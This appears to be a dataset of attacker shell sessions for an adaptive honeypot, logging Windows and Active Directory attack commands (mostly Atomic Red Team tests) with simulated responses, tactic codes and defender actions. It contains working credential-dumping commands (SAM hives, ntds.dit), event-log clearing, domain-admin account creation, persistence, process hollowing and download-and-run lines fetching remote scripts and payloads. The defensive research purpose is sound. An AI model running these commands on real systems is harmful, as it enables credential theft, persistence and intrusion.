+command:net group "BUILTIN\Backup Operators" /doma
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group /domai "Domain Admins"
+response:The syntax of the command is incorrect.
+PS C:\Users\chris>
+tactic:8
+technique:72
+
+
+action:{ Restore to original state }
+command:mkdir c:\exfil
+response:PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Restore to original state }
+command:diskshadow.exe /s C:\atomics\T1003.003\src\diskshadow.txt
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:'c:\atomics\T1055.011\bin\T1055.011_#{arch}.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:The syntax of the command is incorrect.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ Restore to original state }
+command:mkdir c:\exfil
+response:PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Restore to original state }
+command:diskshadow.exe /s C:\atomics\T1003.003\src\diskshadow.txt
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:Access denied.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:DestinationHostUnreachable
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:'c:\atomics\T1055.004\bin\T1055.exe' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\Users\chris>
+tactic:0
+technique:29
+
+
+action:{ if response is file content, modify the file content }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:The syntax of this command is correct.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:The syntax of this command is correct.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:Access denied.
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:0
+technique:37
+
+
+action:{ Restore to original state }
+command:$SamAccountName = 'T1136.002_Admin'
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+response:PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Restore to original state }
+command:$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:$User.SamAccountName = $SamAccountName
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:$User.SetPassword($TempCred.GetNetworkCredential().Password)
+response:PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:CreateProcessWithPipe is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> 
+
+tactic:0
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Regedit.exe is not recognized as an internal or external command,
+operable program or batch file.
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The syntax of this command is incorrect.
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Restore to original state }
+command:Write-Host Joining this computer to a domain must be done manually.
+response:Joining this computer to a domain must be done manually.
+PS C:\Users\chris>
+tactic:7
+technique:62
+
+
+action:{ Restore to original state }
+command:Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+response:Add-WindowsCapability: The term 'Add-WindowsCapability' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:6
+technique:103
+
+
+action:{ Restore to original state }
+command:get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+response:Get-ADUser : The term 'Get-ADUser' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:New-Item : Cannot find path 'C:\atomics\T1055.004\bin' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.004\bin:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:Invoke-WebRequest : The term 'Invoke-WebRequest' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:2
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:5
+technique:40
+
+
+action:{ Restore to original state }
+command:vssadmin.exe create shadow /for=C:
+response:Access is denied.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response is file content, modify the file content }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:The system cannot find the file specified.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:Access to the path 'C:\atomics\T1059.003\src' is denied.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:cmd : The argument 'C:\atomics\T1059.003\src\t1059.003_cmd.cmd' cannot be null or empty.
+At line:1 char:1
++ cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [cmd], RuntimeException
+    + FullyQualifiedErrorId : ArgumentNullException
+PS C:\Users\chris>
+tactic:6
+technique:200
+
+
+action:{ Restore to original state }
+command:$logs = Get-EventLog -List | ForEach-Object {$_.Log}
+response:Logs
+----
+Application
+HardwareEvents
+Internet Explorer
+Microsoft-Windows-Eventlog/Operational
+Microsoft-Windows-Security-Auditing
+System
+Setup
+Windows PowerShell
+Microsoft-Windows-GroupPolicy/Operational
+Microsoft-Windows-DNS-Client/Admin
+PS C:\Users\chris>
+tactic:4
+technique:103
+
+
+action:{ Restore to original state }
+command:$logs | ForEach-Object {Clear-EventLog -LogName $_ }
+response:Clear-EventLog : Access to the event log is denied.
+At line:1 char:22
++ $logs | ForEach-Object {Clear-EventLog -LogName $_ }
++                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Clear-EventLog], SecurityException
+    + FullyQualifiedErrorId : AccessDenied
+PS C:\Users\chris>
+tactic:8
+technique:181
+
+
+action:{ if response is file content, modify the file content }
+command:Get-EventLog -list
+response:LogName                     CurrentEntries Type
+--------                     --------------- ----
+Application                           123456 Application
+Security                              654321 Security
+System                                987654 System
+Setup                                  123456 Setup
+Windows PowerShell                      123 PowerShell
+Microsoft-Windows-Eventlog/Operational   321 Windows-Eventlog
+Microsoft-Windows-Security-Auditing      654 Security-Auditing
+Microsoft-Windows-GroupPolicy/Operational  456 GroupPolicy
+Microsoft-Windows-DNS-Client/Admin       321 DNS-Client
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:reg save HKLM\sam %temp%\sam
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:5
+technique:181
+
+
+action:{ Restore to original state }
+command:reg save HKLM\system %temp%\system
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Restore to original state }
+command:reg save HKLM\security %temp%\security
+response:The operation completed successfully.
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Restore to original state }
+command:wmic shadowcopy call create Volume=C:\
+response:Method execution successful.
+Out Argument Target="\\?\GLOBALROOT\Device\HarddiskVolume shadow copy1"
+Return Value = 0
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:The syntax of this command is incorrect.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:The specified account name is not valid.
+PS C:\Users\chris>
+tactic:5
+technique:103
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$startingDirectory = "C:\Users"
+response:$startingDirectory = "C:\Users"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:$fileExtensionsString = ".doc, .docx, .txt"
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:$fileExtensions = $fileExtensionsString -split ", "
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:New-Item : Access to the path 'C:\atomics\..\ExternalPayloads\T1005' is denied.
+At line:1 char:1
++ New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\..\ExternalPayloads\T1005:String) [New-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : NewItemUnauthorizedAccess
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ allow command execute this time }
+command:Function Search-Files {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:  param (
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:    [string]$directory
+response:PS C:\Users\chris>
+tactic:6
+technique:46
+
+
+action:{ Restore to original state }
+command:  )
+response:PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ Restore to original state }
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:Access to the path is denied.
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  }
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  return $files
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:$foundFiles = Search-Files -directory $startingDirectory
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:if ($foundFiles.Count -gt 0) {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  $foundFilePaths = $foundFiles.FullName
+response:PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+response:Compress-Archive : Access to the path 'C:\atomics\..\ExternalPayloads\T1005\data.zip' is denied.
+At line:1 char:1
++ Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\..\ExternalPayloads\T1005\data.zip:String) [Compress-Archive], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DestinationUnauthorizedAccess
+    + FullyQualifiedErrorId : DestinationUnauthorizedAccess
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  Write-Host "Zip file created: $outputZip\data.zip"
+response:Write-Host : Access to the path is denied.
+At line:1 char:1
++ Write-Host "Zip file created: $outputZip\data.zip"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (Access to the path is denied.:String) [Write-Host], RuntimeException
+    + FullyQualifiedErrorId : RuntimeException
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:
+command:  } else {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:      Write-Host "No files found with the specified extensions."
+response:No files found with the specified extensions.
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:  }
+response:PS C:\Users\chris>
+tactic:6
+technique:123
+
+
+action:{ Restore to original state }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:PS C:\Users\chris>
+tactic:6
+technique:37
+
+
+action:{ Restore to original state }
+command:  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+response:Add-WindowsCapability : The term 'Add-WindowsCapability' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Add-WindowsCapability:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:} else {
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ Restore to original state }
+command:  Install-WindowsFeature RSAT-AD-PowerShell
+response:Install-WindowsFeature : The term 'Install-WindowsFeature' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Install-WindowsFeature RSAT-AD-PowerShell
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Install-WindowsFeature:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:10
+technique:29
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
+response:The specified path is invalid.
+PS C:\Users\chris>
+tactic:6
+technique:149
+
+
+action:{ Restore to original state }
+command:Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *
+response:Get-ADComputer : The term 'Get-ADComputer' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADComputer:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:Cannot find path 'C:\atomics\T1055.012\src\Start-Hollow.ps1' because it does not exist.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Restore to original state }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\W...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net localgroup
+response:Alias name     Members
+-----------     -------
+Administrators  User1, User2
+Users           User3
+Guests          User4
+Power Users     User5
+Backup Operators User6
+Remote Desktop Users User7
+Network Configuration Operators User8
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Restore to original state }
+command:net group /domain
+response:Group name                           Comment
+-------------------------------------- -------
+Domain Admins                        Administrators for the domain
+Domain Users                         All user accounts in the domain
+Domain Guests                        Built-in accounts for guests
+Domain Computers                     All computer accounts in the domain
+Domain Controllers                   All domain controllers in the domain
+Enterprise Admins                    Enterprise administrators
+Group Policy Creator Owners          Group Policy creator owners
+Schema Admins                        Schema administrators
+PS C:\Users\chris>
+tactic:3
+technique:134
+
+
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:{ Restore to original state }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+
+tactic:2
+technique:131
+
+
+action:{ Restore to original state }
+command:mkdir C:\Windows\Temp\ntds_T1003
+response:PS C:\Users\chris> mkdir : Access to the path 'C:\Windows\Temp\ntds_T1003' is denied.
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Restore to original state }
+command:ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
+response:PS C:\Users\chris> ntdsutil : The term 'ntdsutil' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item : Cannot find path 'C:\atomics\T1055.002\bin' because it does not exist.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.002\bin:String) [New-Item], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:PS C:\Users\chris> Invoke-WebRequest : Cannot connect to the remote server
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/mast ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequest
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:PS C:\Users\chris> Start-Process : The system cannot find the file specified.
+At line:1 char:1
++ Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.002\bin\RedInjection.exe:String) [Start-Process], FileNotFoundException
+    + FullyQualifiedErrorId : FileNotFoundException,Microsoft.PowerShell.Commands.StartProcessCommand
+PS C:\Users\chris>
+tactic:2
+technique:141
+
+
+action:{ Restore to original state }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris> Start-Sleep : The term 'Start-Sleep' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris> Get-Process : No process matching the name 'Notepad' was found.
+At line:1 char:1
++ Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Notepad:String) [Get-Process], Exception
+    + FullyQualifiedErrorId : NoProcessFoundException,Microsoft.PowerShell.Commands.GetProcessCommand
+PS C:\Users\chris>
+tactic:2
+technique:17
+
+
+action:{ Restore to original state }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Restore to original state }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe : The term 'REG.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:131
+
+
+action:{ Restore to original state }
+command:iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
+response:PS C:\Users\chris> iex : The term 'iex' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:PS C:\Users\chris> net : The term 'net' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Restore to original state }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:PS C:\Users\chris> net : The term 'net' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:5
+technique:178
+
+
+action:{ Restore to original state }
+command:echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+response:Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Restore to original state }
+command:wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
+response:PS C:\Users\chris> wmic : The term 'wmic' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
